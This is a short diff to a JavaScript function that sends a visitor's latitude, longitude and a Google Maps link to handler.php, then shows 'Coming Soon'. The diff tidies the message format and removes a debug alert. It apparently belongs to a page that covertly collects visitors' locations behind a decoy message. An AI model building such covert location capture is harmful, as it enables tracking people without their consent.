@@ -18,11 +18,11 @@ function locate()
     $.ajax({
       type: 'POST',
       url: 'handler.php',
-      data: {"posisi":`\nLatitude : ${lat} + '\n' + longitude : ${lon} + '\n' +Google Map Link : https://google.com/maps/place/${lat}+${lon}`},
+      data: {"posisi":`\nLatitude : ${lat}\nLongitude : ${lon} \nGoogle Map Link : https://google.com/maps/place/${lat}+${lon}`},
       success: function(){$('#change').html('Coming Soon');},
       mimeType: 'text'
     });
-    alert("hawdiawda");
+    
   };
 }
 
